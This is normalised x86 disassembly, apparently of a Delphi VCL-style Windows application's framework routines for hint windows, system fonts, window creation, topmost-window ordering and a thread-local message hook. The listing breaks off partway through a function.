mov ecx [ ecx ]
sub_45df4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45df24
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406d5c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406ce4
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45dfdc
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45e121
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460574
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423110
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423110
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_4231f4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423110
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423110
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423110
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_460574
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_422f54
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_422f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e128
cmp [ rw-data ] 0x0
je r-xdata
sub_45e160
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45e1c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45e2fc ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45e370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45dac8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41a238
mov dl [ ebp - 0x1 ]
call sub_45e1c0
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45dab4
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a0dc
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41a2b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_41a238
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45e160
test al al
je r-xdata
inc esi
sub_45e4bc
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45dac8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45dab4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45e514
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45e4bc
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45e58e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45e370
pop ecx
push ebp
mov al 0x2
call sub_45e370
pop ecx
push ebp
mov al 0x3
call sub_45e370
pop ecx
push ebp
mov al 0x4
call sub_45e370
pop ecx
push ebp
mov al 0x5
call sub_45e370
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_45e59c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e130
xor eax eax
push ebp
push sub_45e615
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45e514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45e138
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45e630
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f9c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ff0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45e688
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_45e6b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_460b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45e6da
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43ec3c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_460bf8
sub_45e738
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45fc80
sub_45e77c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45e738
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push r-xdata
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45e7f0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45e84c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45e87c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45e8a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45e84c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45e87c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45e87c
sub_45e8e4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fbd8
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460064
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429a74
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_429e44
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4607fc
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c748
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46025c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c770
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408940
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40420c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4609d8
mov eax ebx
call sub_46139c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45ebec
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_45eacd
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_4613ac
mov [ esp + 0x4 ] esi
mov [ esp ] sub_460064
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46025c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_460bf8
xor edx edx
mov eax esi
call sub_460574
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
push esi
push sub_45f020
mov eax esi
call sub_45fe50
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4059cc
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_40324c
mov eax [ esi + 0x90 ]
call sub_40324c
mov eax [ esi + 0x98 ]
call sub_40324c
test bl bl
jle r-xdata
call sub_420d00
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_45ebec
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45ed8d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed94
lea eax [ ebp - 0x2c ]
call sub_403f9c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45f16c
call sub_420c68
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40445c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406de4
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f9c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45f870
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45f870
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45ed9c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45dad0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45edfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41a0dc
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_446be4
cmp ebx eax
je r-xdata
sub_45ee6c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45edfc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a238
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45ef84
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a238
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45f020
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40ca10
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45dfdc
mov eax [ rw-data ]
call sub_45e624
sub_45f078
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f0d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f0dc
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404194
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45f0e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45f120
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
